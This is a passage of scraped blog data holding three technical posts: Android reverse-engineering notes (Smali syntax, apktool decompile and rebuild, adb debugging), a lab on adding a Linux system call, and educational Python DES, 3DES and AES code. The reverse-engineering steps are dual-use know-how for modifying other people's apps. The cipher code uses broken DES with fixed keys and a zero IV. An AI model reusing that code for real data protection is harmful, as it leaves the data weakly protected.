Manifest.MF res 文件夹 资源目录，在编译时自动生成索引文件（R.java），在 Java 代码中用 R.xxx.yyy 来引用 AndroidManifest.xml Android 工程的基础配置属性文件（描述 Android 应用的信息，包括类名、组件名等） classes.dex Java 代码编译得到的 Dalvik VM 能直接执行的文件 resources.arsc 对 res 目录下资源的一个索引文件，保存了原工程中 string.xml 等文件内容 其他文件夹 一般来说，除了音频和视频资源（需要放在 raw 或 asset 下），使用 Java 开发的 Android 工程使用到的资源文件都会放在 res 下；使用 C++游戏引擎（或使用 Lua Unity3D 等）的资源文件均需要放在 asset 下。 Dalvik 字节码Dalvik 是谷歌专门为 Android 操作系统设计的一个虚拟机，经过深度的优化。虽然 Android 上的程序是使用 Java 来开发的，但是 Dalvik 和标准的 Java 虚拟机 JVM 还是两回事。Dalvik VM 是基于寄存器的，而 JVM 是基于栈的；Dalvik 有专属的文件执行格式 dex（Dalvik Executable），而 JVM 则执行的是 Java 字节码。Dalvik VM 比 JVM 速度更快，占用空间更少。 Smali 文件结构Smali、Baksmali 分别是指 Android 系统里的 Dalvik 虚拟机所使用的一种 dex 格式文件的汇编器、反汇编器。其语法是一种宽松式的 Jasmin/Dedexer 语法，而且它实现了 dex 格式所有功能（注解、调试信息、线路信息等）。 当我们对 APK 文件进行反编译后，便会生成此类文件。其中在 Dalvik 字节码中，寄存器都是 32 位的，能够支持任何类型，64 位类型（Long/Double）用 2 个寄存器表示；Dalvik 字节码有两种类型：原始类型、引用类型（包括对象和数组）。 头部定义 .class .super .source 域定义 .field public .field static .field private … 函数定义Smali 函数（使用 P-V 寄存器）在 smali 里的所有操作都必须经过寄存器来进行：本地寄存器用 v 开头、数字结尾的符号来表示，如 v0、v1、v2 等；参数寄存器则使用 p 开头、数字结尾的符号来表示，如 p0、p1、p2 等。特别注意的是，p0 不一定是函数中的第一个参数，在非 static 函数中，p0 代指 this，p1 表示函数的第一个参数，p2 代表函数中的第二个参数；而在 static 函数中 p0 才对应第一个参数（因为 Java 的 static 方法中没有 this 方法）。 123456.method 访问修饰符 函数名 函数签名 .locals n # 使用 n 个寄存器，即 v0~v(n-1) .param p1, \"savedInstanceState\" # Landroid/os/Bundle # 注释 ... # 函数实现 return-xxx # 返回.end method 函数调用参数通过寄存器传递（Pn、Vn） 1Invoke&#123;参数&#125;, 方法名 Smali 字段描述符 Java type Type descriptor void V boolean Z char C byte B short S int I float F long J double D Object Ljava/lang/Object; int[] [I byte[] [B Object[][] [[Ljava/lang/Object; Smali 基本语法 Keyword descriptor Description .field private isFlag:z 定义变量 .method 方法 .parameter 方法参数 .prologue 方法开始 .line 123 此方法位于第 123 行 const/high16 v0, 0x7f03 把 0x7f03 赋值给 v0 return-void 函数返回 void .end method 函数结束 new-instance 创建实例 iput-object 对象赋值 iget-object 调用对象 move-result-object 将上一句的结果赋值给寄存器 new-array v0, v1, type 构造指定类型与大小的数组，并赋值给寄存器 array-length v0, v1 获取指定寄存器中数组的长度并赋值给寄存器 const/4 赋值 rem-int/2addr v0, v1 计算模结果存入寄存器 int-to-byte 整型转字节型 goto 直接跳转到指定位置 return-object 返回一个对象类型 Smali 中函数的调用函数分为 direct 和 virtual 两种类型。direct method 就是 private 函数，其余的 public 和 protected 函数都属于 virtual method。 invoke-static调用静态函数。 1invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V invoke-super调用父类方法用的指令（一般用于调用 onCreate、onDestroy）。 invoke-direct调用 private 函数。 1invoke-direct &#123;p0&#125;, Landroid/app/TabActivity;-&gt;&lt;init&gt;()V invoke-virtual用于调用 protected 或 public 函数。 1invoke-virtual &#123;v0,v1&#125;, Lcom/ccc;-&gt;Message(Ljava/lang/Object;)V invoke-xxxxx/range当方法参数多于 5 个时（含 5 个），不能直接使用以上指令，而是在后面加上 /range 表示范围。 1invoke-direct/range &#123;v0 .. v5&#125;, Lcmb/pb/ui/PBContainerActivity;-&gt;h(ILjava/lang/CharSequence;Ljava/lang/String;Landroid/content/Intent;I)Z Smali 中的条件跳转分支 代码 含义 if-eq vA, vB, :cond_** 如果 vA 等于 vB 则跳转到 :cond_** if-ne vA, vB, :cond_** 如果 vA 不等于 vB 则跳转到 :cond_** if-lt vA, vB, :cond_** 如果 vA 小于 vB 则跳转到 :cond_** if-ge vA, vB, :cond_** 如果 vA 大于等于 vB 则跳转到 :cond_** if-gt vA, vB, :cond_** 如果 vA 大于 vB 则跳转到 :cond_** if-le vA, vB, :cond_** 如果 vA 小于等于 vB 则跳转到 :cond_** if-eqz vA, :cond_** 如果 vA 等于 0 则跳转到 :cond_** if-nez vA, :cond_** 如果 vA 不等于 0 则跳转到 :cond_** if-ltz vA, :cond_** 如果 vA 小于 0 则跳转到 :cond_** if-gez vA, :cond_** 如果 vA 大于等于 0 则跳转到 :cond_** if-gtz vA, :cond_** 如果 vA 大于 0 则跳转到 :cond_** if-lez vA, :cond_** 如果 vA 小于等于 0 则跳转到 :cond_** Smali 代码编写静态返回 HelloWorld 的方法123456789.class public Lf8/helloworld/helloStr; # 类声明 .super Ljava/lang/Object; # 父类声明 .method public static retHello()Ljava/lang/String; # 函数声明 .locals 1 # 寄存器数量 const-string v0, \"Hello World from StaticMethod\" # 新建字符串 return-object v0 # 返回Object类型.end method # 方法结束声明 返回静态 field 的方法123456.field public static final hStr:Ljava/lang/String; = \"Hello World from static field\" # field声明与初始化.method public static retHello2()Ljava/lang/String; .locals 1 sget-object v0, Lf8/helloworld/helloStr;-&gt;hStr:Ljava/lang/String; # 获取field return-object v0.end method 普通的函数1234567891011.method public constructor &lt;init&gt;()V .locals 0 invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V return-void.end method.method public retHello3()Ljava/lang/String; .locals 1 const-string v0, \"Hello World from Method\" return-object v0.end method 普通的 field 与函数1234567891011121314.field public hStr2:Ljava/lang/String;.method public constructor &lt;init&gt;()V .locals 1 invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V const-string v0, \"Hello field\" # 初始化非静态field iput-object v0, p0, Lf8/helloworld/helloStr;-&gt;hStr2:Ljava/lang/String; return-void.end method.method public retHello4()Ljava/lang/String; .locals 1 iget-object v0, p0, Lf8/helloworld/helloStr;-&gt;hStr2:Ljava/lang/String; return-object v0.end method 调用时需要先初始化一个实例： 1234new-instance v1, Lf8/helloworld/helloStr;invoke-direct &#123;v1&#125;, Lf8/helloworld/helloStr;-&gt;&lt;init&gt;()Vinvoke-virtual &#123;v1&#125;, Lf8/helloworld/helloStr;-&gt;retHello3()Ljava/lang/String;move-result-object v1 OthersAndroid Log来自于包 android/killer/log。 1invoke-static &#123;v0&#125;, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V LoadLibrary1invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V stackTrace打印当前函数堆栈，方法为 Thread.dumpStack()。 1invoke-static &#123;&#125;, Ljava/lang/Thread;-&gt;dumpStack()V Method Trace函数跟踪。 12invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;startMethodTracing()Vinvoke-static &#123;&#125;, Landroid/os/Debug;-&gt;stopMethodTracing()V 需要添加权限。 12&lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/&gt;&lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/&gt; 保存的 trace 文件可以 dump 出来使用 monitor 来打开。 字符串处理123456789const-string v1, &quot;%d&quot; # 格式化描述符const/4 v2, 0x1 # 数组长度new-array v2, v2 [Ljava/lang/Object; # 创建Object数组aput-object v3, v2, v4 # 填充数组...invoke-static &#123;v1, v2&#125;, Ljava/lang/String;-&gt;format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String; # 格式化字符串# 字符串替换invoke-virtual &#123;v0, v1, v2&#125;, Ljava/lang/String;-&gt;replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;invoke-virtual &#123;v0, v1, v2&#125;, Ljava/lang/String;-&gt;replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String; waitForDebugger1invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;waitForDebugger()V apktool/ShakaApktool12java -jar apktool.jar d example.apk -o example-dirjava -jar apktool.jar b example-dir -o example.apk 选项 功能 d 反编译 b 回编译 12java -jar ShakaApktool.jar d -df example.apk -o example-dirjava -jar ShakaApktool.jar b example-dir -o example.apk 选项 功能 -df、--default-framework 使用默认的框架资源文件 安卓 apk 调试（不需要修改原 apk 文件） 使用 apktool/ShakaApktool 反编译 apk 文件 在 Android Studio 中导入源码 设置远程调试选项，Host 填写为 localhost，端口填写为 8700 在 Debugger setup 中勾选 Suspend on process entry point、Suspend on thread start/exit 以及 Suspend on library load/unload 使用 adb 以 debug 方式启动 apk：adb shell am start -D -n packageName/ActivityName 下好断点，打开 monitor，开始调试 Referenceshttps://www.bilibili.com/video/av45424886https://www.52pojie.cn/thread-395689-1-1.htmlhttps://www.52pojie.cn/thread-396966-1-1.htmlhttps://www.52pojie.cn/thread-397858-1-1.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"android","slug":"android","permalink":"blog.b3ale.cn/tags/android/"}]},{"title":"如何给Linux添加系统调用","slug":"如何给Linux添加系统调用","date":"2019-11-27T05:50:19.000Z","updated":"2019-12-10T12:35:56.400Z","comments":true,"path":"2019/11/27/如何给Linux添加系统调用/","link":"","permalink":"blog.b3ale.cn/2019/11/27/如何给Linux添加系统调用/","excerpt":"操作系统实验记录。","text":"操作系统实验记录。 EnvironmentOS：Ubuntu 16.04.6 12➜ ~ uname -aLinux ubuntu 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 14:01:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux First: Download Linux Kernel Source1234wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.20.17.tar.gztar -xvf linux-4.20.17.tar.gzsudo mv linux-4.20.17/ /usr/src/cd /usr/src/linux-4.20.17/ Second: Install Dependences12sudo apt updatesudo apt install bison flex libssl-dev libncurses5-dev Third: Add My Syscall入口（arch/x86/entry/syscalls/syscall_64.tbl） 12# Here are my syscalls548 64 mysyscall sys_mysyscall 系统调用声明（include/linux/syscalls.h） 12// Here are my syscallsasmlinkage long sys_mysyscall(void); 添加调用（kernel/sys.c） 12345// Here are my syscallsasmlinkage long sys_mysyscall(void) &#123; printk(\"Hello Kernel!!!\\n\"); return 1712190426;&#125; Forth: Compile12345678make mrpropermake cleanmake menuconfig # 将Device drivers中的Staging drivers取消# 下面的编译时间比较久 可以通过time记录一下时间time make bzImage # 编译并生成压缩的内核映像 大约半个小时time make modules # 编译模块 大约两个多小时sudo time make modules_install # 安装模块 大约三分多种sudo time make install # 安装内核 大约一分多钟 编译成功后 reboot 重启系统。 Fifth: Test12➜ ~ uname -aLinux ubuntu 4.20.17 #1 SMP Thu Nov 28 22:48:22 PST 2019 x86_64 x86_64 x86_64 GNU/Linux 查看添加的系统调用是否成功： 123➜ ~ grep -A 1 mysyscall /proc/kallsyms0000000000000000 T sys_mysyscall0000000000000000 T usermodehelper_read_unlock 编写测试程序如下： 12345678#include &lt;stdio.h&gt;#include &lt;sys/syscall.h&gt;int main() &#123; long ret = syscall(548); printf(\"%ld\\n\", ret); return 0;&#125; 运行结果，返回值为设定好的值： 12➜ ~ ./31712190426 使用 dmesg 命令（dmesg 命令显示 linux 内核的环形缓冲区信息，我们可以从中获得诸如系统架构、cpu、挂载的硬件，RAM 等多个运行级别的大量的系统信息）查看调用情况： 12➜ ~ dmesg | grep \"Hello\"[ 228.310507] Hello Kernel!!! Referenceshttps://www.cnblogs.com/tod-reg20130101/articles/9280792.htmlhttps://www.zybuluo.com/hakureisino/note/514321https://www.jianshu.com/p/b2d5fa8af581","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"blog.b3ale.cn/tags/linux/"}]},{"title":"Python实现DES、AES加密解密算法","slug":"Python实现DES、AES加密解密算法","date":"2019-11-14T02:09:38.000Z","updated":"2020-02-22T03:49:00.371Z","comments":true,"path":"2019/11/14/Python实现DES、AES加密解密算法/","link":"","permalink":"blog.b3ale.cn/2019/11/14/Python实现DES、AES加密解密算法/","excerpt":"通过实现 DES 和 AES 深入了解对称加密（实现均采用 CBC 模式）。","text":"通过实现 DES 和 AES 深入了解对称加密（实现均采用 CBC 模式）。 DES数据加密标准（英语：Data Encryption Standard，缩写为 DES）是一种对称密钥加密块密码算法，1976 年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），随后在国际上广泛流传开来。它基于使用 56 位密钥的对称算法。这个算法因为包含一些机密设计元素，相对短的密钥长度以及怀疑内含美国国家安全局（NSA）的后门而在开始时有争议，DES 因此受到了强烈的学院派式的审查，并以此推动了现代的块密码及其密码分析的发展。 算法流程DES 是一种典型的块密码—一种将固定长度的明文通过一系列复杂的操作变成同样长度的密文的算法。对 DES 而言，块长度为 64 位。同时，DES 使用密钥来自定义变换过程，因此算法认为只有持有加密所用的密钥的用户才能解密密文。密钥表面上是 64 位的，然而只有其中的 56 位被实际用于算法，其余 8 位可以被用于奇偶校验，并在算法中被丢弃。因此，DES 的有效密钥长度仅为 56 位。 整体结构算法的整体结构中，有 16 个相同的处理过程（round），并在首尾各有一次置换，称为 $IP$ 与 $FP$（或称 $IP^-1$，$FP$ 为 $IP$ 的反函数。$IP$ 和 $FP$ 几乎没有密码学上的重要性，为了在 1970 年代中期的硬件上简化输入输出数据库的过程而被显式的包括在标准中。 在主处理回次前，数据块被分成两个 32 位的半块，并被分别处理；这种交叉的方式被称为费斯妥结构。费斯妥结构保证了加密和解密过程足够相似—唯一的区别在于子密钥在解密时是以反向的顺序应用的，而剩余部分均相同。这样的设计大大简化了算法的实现，尤其是硬件实现，因为没有区分加密和解密算法的需要。 $\\oplus$ 符号代表异或（XOR）操作。“F 函数”将数据半块与某个子密钥进行处理。然后，一个 F 函数的输出与另一个半块异或之后，再与原本的半块组合并交换顺序，进入下一个回次的处理。在最后一个回次完成时，两个半块需要交换顺序，这是费斯妥结构的一个特点，以保证加解密的过程相似。 费斯妥函数（F 函数）费斯妥函数（F 函数）的过程中，其每次对半块（32 位）进行操作，并包括四个步骤： 扩张：用扩张置换（图中的 E）将 32 位的半块扩展到 48 位，其输出包括 8 个 6 位的块，每块包含 4 位对应的输入位，加上两个邻接的块中紧邻的位。 与密钥混合：用异或操作将扩张的结果和一个子密钥进行混合。16 个 48 位的子密钥—每个用于一个回次的 F 变换—是利用密钥调度从主密钥生成的（见下文）。 S 盒：在与子密钥混合之后，块被分成 8 个 6 位的块，然后使用“S 盒”，或称“置换盒”进行处理。8 个 S 盒的每一个都使用以查找表方式提供的非线性的变换将它的 6 个输入位变成 4 个输出位。S 盒提供了 DES 的核心安全性—如果没有 S 盒，密码会是线性的，很容易破解。 置换：最后，S 盒的 32 个输出位利用固定的置换，“P 置换”进行重组。这个设计是为了将每个 S 盒的 4 位输出在下一回次的扩张后，使用 4 个不同的 S 盒进行处理。 S 盒，P 置换和 E 扩张各自满足了克劳德·香农在 1940 年代提出的实用密码所需的必要条件，“混淆与扩散”。 密钥调度加密过程中密钥调度—产生子密钥的算法里，首先使用选择置换 1（PC-1）从 64 位输入密钥中选出 56 位的密钥—剩下的 8 位要么直接丢弃，要么作为奇偶校验位。然后，56 位分成两个 28 位的半密钥；每个半密钥接下来都被分别处理。在接下来的回次中，两个半密钥都被左移 1 或 2 位（由回次数决定），然后通过选择置换 2（PC-2）产生 48 位的子密钥—每个半密钥 24 位。移位（图中由&lt;&lt;标示）表明每个子密钥中使用了不同的位，每个位大致在 16 个子密钥中的 14 个出现。 解密过程中，除了子密钥输出的顺序相反外，密钥调度的过程与加密完全相同。 算法实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178#!/usr/bin/env python# -*- encoding=utf-8 -*-ENCRYPT = 0DECRYPT = 1BLOCK_SIZE = 8# 明文分组初始置换表IP = [58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7]# 末置换表IP_ = [40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25]# S盒压缩置换表（6bit-&gt;4bit）S1 = [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7, 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8, 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0, 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]S2 = [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10, 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5, 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15, 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]S3 = [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1, 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7, 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]S4 = [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15, 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9, 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4, 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]S5 = [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9, 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6, 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14, 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]S6 = [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11, 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8, 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6, 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]S7 = [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1, 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6, 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2, 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]S8 = [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7, 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2, 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8, 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]S = [S1, S2, S3, S4, S5, S6, S7, S8]# P盒置换表（32bit）P = [16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25]# 密钥置换表（64bit-&gt;56bit）PC_1 = [57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4]# 密钥压缩置换表（56bit-&gt;48bit）PC_2 = [14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32]# 明文扩展置换表（32bit-&gt;48bit）E = [32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25, 24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1]# 子密钥循环左移位数表（16次）SHIFT = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]sub_keys = [[0] * 48] * 16def convert_string_to_bitlist(string): data = [ord(c) for c in string] l = len(data) * 8 result = [0] * l pos = 0 for ch in data: i = 7 while i &gt;= 0: if ch &amp; (1 &lt;&lt; i) != 0: result[pos] = 1 else: result[pos] = 0 pos += 1 i -= 1 return resultdef convert_bitlist_to_string(bitlist): result = [] pos = 0 c = 0 while pos &lt; len(bitlist): c += bitlist[pos] &lt;&lt; (7 - pos % 8) if pos % 8 == 7: result.append(c) c = 0 pos += 1 return ''.join([chr(c) for c in result])def permute(table, block): return list(map(lambda x: block[x - 1], table))def create_sub_keys(key): key = permute(PC_1, convert_string_to_bitlist(key)) i = 0 lkey = key[:28] rkey = key[28:] while i &lt; 16: j = 0 while j &lt; SHIFT[i]: lkey.append(lkey[0]) del lkey[0] rkey.append(rkey[0]) del rkey[0] j += 1 sub_keys[i] = permute(PC_2, lkey + rkey) # print sub_keys[i] i += 1def des_cipher(block, choice): block = permute(IP, block) lblock = block[:32] rblock = block[32:] if choice == ENCRYPT: iteration = 0 iteration_adjustment = 1 elif choice == DECRYPT: iteration = 15 iteration_adjustment = -1 i = 0 # 16轮F函数 while i &lt; 16: rtemp = rblock[:] # 将右半块32位扩展为48位 rblock = permute(E, rblock) # 将扩展后的右半块和轮密钥进行逐位异或 rblock = list(map(lambda x, y: x ^ y, rblock, sub_keys[iteration])) b = [rblock[:6], rblock[6:12], rblock[12:18], rblock[18:24], rblock[24:30], rblock[30:36], rblock[36:42], rblock[42:]] j = 0 bn = [0] * 32 pos = 0 # S盒置换 while j &lt; 8: row = (b[j][0] &lt;&lt; 1) + b[j][5] col = (b[j][1] &lt;&lt; 3) + (b[j][2] &lt;&lt; 2) + (b[j][3] &lt;&lt; 1) + b[j][4] v = S[j][(16 * row) + col] bn[pos] = (v &amp; 8) &gt;&gt; 3 bn[pos + 1] = (v &amp; 4) &gt;&gt; 2 bn[pos + 2] = (v &amp; 2) &gt;&gt; 1 bn[pos + 3] = v &amp; 1 pos += 4 j += 1 # 与P盒进行置换 rblock = permute(P, bn) rblock = list(map(lambda x, y: x ^ y, rblock, lblock)) lblock = rtemp i += 1 iteration += iteration_adjustment final = permute(IP_, rblock + lblock) return finaldef cipher(data, key, iv, choice): if len(data) % BLOCK_SIZE != 0: raise ValueError(\"Data length illegal.\") if len(key) != 8 or len(iv) != 8: raise ValueError(\"key/iv\\'s length should be 8.\") create_sub_keys(key) iv = convert_string_to_bitlist(iv) i = 0 result = [] while i &lt; len(data): block = convert_string_to_bitlist(data[i:i + 8]) if choice == ENCRYPT: block = list(map(lambda x, y: x ^ y, block, iv)) block = des_cipher(block, choice) iv = block elif choice == DECRYPT: temp = block[:] block = des_cipher(block, choice) block = list(map(lambda x, y: x ^ y, block, iv)) iv = temp result.append(convert_bitlist_to_string(block)) i += 8 return ''.join(result)if __name__ == '__main__': key = '#qianfei' iv = '0' * 8 data = '#qianfei11111111' ciphertext = cipher(data, key, iv, ENCRYPT) # print [ord(c) for c in ciphertext] print ciphertext plaintext = cipher(ciphertext, key, iv, DECRYPT) # print [ord(c) for c in plaintext] print plaintext 3DES密码学中，三重数据加密算法（英语：Triple Data Encryption Algorithm，缩写为 TDEA，Triple DEA），或称 3DES（Triple DES），是一种对称密钥加密块密码，相当于是对每个数据块应用三次数据加密标准（DES）算法。由于计算机运算能力的增强，原版 DES 密码的密钥长度变得容易被暴力破解；3DES 即是设计用来提供一种相对简单的方法，即通过增加 DES 的密钥长度来避免类似的攻击，而不是设计一种全新的块密码算法。 算法流程三重 DES 的本质上就是经过了三次 DES 操作，密钥长度为 24 字节，拆分为三个长为 8 字节的密钥，加密时依次对明文进行加密、解密、加密的操作，解密时相反。具体如下： $$Ciphertext = E_{K3}(D_{K2}(E_{K1}(Plaintext))) \\Plaintext = D_{K1}(E_{K2}(D_{K3}(Ciphertext)))$$ 算法实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566...def triple_encipher(data, masterKey, iv): if len(masterKey) == 8: key1 = masterKey[:8] key2 = masterKey[:8] key3 = masterKey[:8] elif len(masterKey) == 16: key1 = masterKey[:8] key2 = masterKey[8:16] key3 = masterKey[:8] else: key1 = masterKey[:8] key2 = masterKey[8:16] key3 = masterKey[16:24] keys = [key1, key2, key3] # print keys i = 0 result = [] while i &lt; len(data): block = cipher(data[i:i + 8], keys[0], iv, ENCRYPT) block = cipher(block, keys[1], iv, DECRYPT) block = cipher(block, keys[2], iv, ENCRYPT) iv = block result.append(block) i += 8 return ''.join(result).encode('base64')def triple_decipher(data, masterKey, iv): if len(masterKey) == 8: key1 = masterKey[:8] key2 = masterKey[:8] key3 = masterKey[:8] elif len(masterKey) == 16: key1 = masterKey[:8] key2 = masterKey[8:16] key3 = masterKey[:8] else: key1 = masterKey[:8] key2 = masterKey[8:16] key3 = masterKey[16:24] keys = [key1, key2, key3] # print keys i = 0 result = [] data = data.decode('base64') while i &lt; len(data): temp = data[i:i + 8] block = cipher(data[i:i + 8], keys[2], iv, DECRYPT) block = cipher(block, keys[1], iv, ENCRYPT) block = cipher(block, keys[0], iv, DECRYPT) iv = temp result.append(block) i += 8 return ''.join(result)if __name__ == '__main__': key = '#qianfei' iv = '0' * 8 data = '#qianfei11111111' ciphertext = triple_encipher(data, key, iv) # print [ord(c) for c in ciphertext] print ciphertext plaintext = triple_decipher(ciphertext, key, iv) # print [ord(c) for c in plaintext] print plaintext AES高级加密标准（英语：Advanced Encryption Standard，缩写：AES），在密码学中又称 Rijndael 加密法，是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的 DES，已经被多方分析且广为全世界所使用。经过五年的甄选流程，高级加密标准由美国国家标准与技术研究院（NIST）于 2001 年 11 月 26 日发布于 FIPS PUB 197，并在 2002 年 5 月 26 日成为有效的标准。2006 年，高级加密标准已然成为对称密钥加密中最流行的算法之一。 算法流程严格地说，AES 和 Rijndael 加密法并不完全一样（虽然在实际应用中两者可以互换），因为 Rijndael 加密法可以支持更大范围的区块和密钥长度：AES 的区块长度固定为 128 比特，密钥长度则可以是 128，192 或 256 比特；而 Rijndael 使用的密钥和区块长度均可以是 128，192 或 256 比特。加密过程中使用的密钥是由 Rijndael 密钥生成方案产生。 AES 密钥长度（32 位比特字) 分组长度(32 位比特字) 加密轮数 AES-128 4 4 10 AES-192 6 4 12 AES-256 8 4 14 大多数 AES 计算是在一个特别的有限域完成的。AES 加密过程是在一个 4×4 的字节矩阵上运作，这个矩阵又称为“体（state）”，其初值就是一个明文区块（矩阵中一个元素大小就是明文区块中的一个 Byte）。（Rijndael 加密法因支持更大的区块，其矩阵的“列数（Row number）”可视情况增加）加密时，各轮 AES 加密循环（除最后一轮外）均包含 4 个步骤： 轮密钥加：矩阵中的每一个字节都与该次回合密钥做 XOR 运算；每个子密钥由密钥生成方案产生。 字节代换：透过一个非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。 行位移：将矩阵中的每个横列进行循环式移位。 列混合：为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每内联的四个字节。最后一个加密循环中省略 MixColumns 步骤，而以另一个轮密钥取代。 轮密钥加轮密钥加中，密钥将会与原矩阵合并。在每次的加密循环中，都会由主密钥产生一把回合密钥（透过 Rijndael 密钥生成方案产生），这把密钥大小会跟原矩阵一样，以与原矩阵中每个对应的字节作异或（⊕）加法。 字节代换在字节代换步骤中，矩阵中的各字节透过一个 8 位的 S-box 进行转换。这个步骤提供了加密法非线性的变换能力。S-box 与 $GF(2^{8})$ 上的乘法反元素有关，已知具有良好的非线性特性。为了避免简单代数性质的攻击，S-box 结合了乘法反元素及一个可逆的仿射变换矩阵建构而成。此外在建构 S-box 时，刻意避开了固定点与反固定点，即以 S-box 替换字节的结果会相当于错排的结果。 ShiftRows行位移描述矩阵的列操作。在此步骤中，每一列都向左循环位移某个偏移量。在 AES 中（区块大小 128 位），第一列维持不变，第二列里的每个字节都向左循环移动一格。同理，第三列及第四列向左循环位移的偏移量就分别是 2 和 3。128 位和 192 